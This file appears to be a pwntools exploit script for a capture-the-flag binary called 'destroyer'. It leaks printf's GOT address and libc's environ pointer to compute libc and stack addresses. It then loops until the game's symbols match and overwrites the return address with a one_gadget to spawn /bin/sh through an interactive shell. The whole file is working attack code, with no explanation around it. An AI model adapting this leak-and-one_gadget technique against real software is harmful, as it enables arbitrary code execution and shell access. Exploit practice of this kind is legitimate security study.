from pwn import *
condition = True
context.log_level = "debug"
while(condition):
    p = process('./destroyer')
    e = ELF('./destroyer')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    printf_got = e.got['printf']
    environ_offset = 0x3ee098
    printf_offset = libc.symbols['printf']
    system_offset = libc.symbols['system']
    binsh_offset = list(libc.search('/bin/sh'))[0]
    gajet = 0x400ce3
    one_gadget = 0xf1147  
    # execve("/bin/sh", rsp+0x70, environ)
    p.sendlineafter("Name: ", "yee")

    payload = ""
    payload += 'a' * 40
    payload += p64(printf_got)
    p.recvuntil("PLAY")
    p.send(payload)
    p.recvuntil("FOR ")
    printf_libc = u64(p.recv(6).ljust(8, "\x00"))
    libc_base = printf_libc - printf_offset
    environ_libc = libc_base + environ_offset
    binsh_libc = libc_base + binsh_offset
    system_libc = libc_base + system_offset

    p.recvuntil("\xe2\x95\xab")
    s1 = p.recv(1)
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s2 = p.recv(1)
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s3 = p.recv(1)

    if s1 == s2 == s3 :
        continue

    payload = ""
    payload += 'a' * 40
    payload += p64(environ_libc)
    p.recvuntil("PLAY")
    p.send(payload)
    p.recvuntil("FOR ")
    stack_environ = u64(p.recv(6).ljust(8, "\x00"))
    stack_ret = stack_environ - 0xf0

    p.recvuntil("\xe2\x95\xab")
    s1 = p.recv(1)
    
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s2 = p.recv(1)

    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s3 = p.recv(1)


    
    if s1 == s2 == s3 :
        continue
    payload = ""
    payload += 'a' * 40
    payload += p64(stack_ret)


    p.recvuntil("PLAY")
    p.send(payload)
    p.recvuntil("\xe2\x95\xab")
    s1 = p.recv(1)
    
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s2 = p.recv(1)
    s2
    p.recvuntil("\xe2\x95\xab")
    p.recvuntil("\xe2\x95\xab")
    s3 = p.recv(1)



    if not(s1 == s2 == s3) :
        continue
    condition = False
print hex(stack_ret)
print hex(stack_environ)
payload = ""
payload += p64(libc_base+one_gadget)
print "jack Pot!!"


print p.recvuntil("again?")
p.send(payload)

print payload




p.interactive()



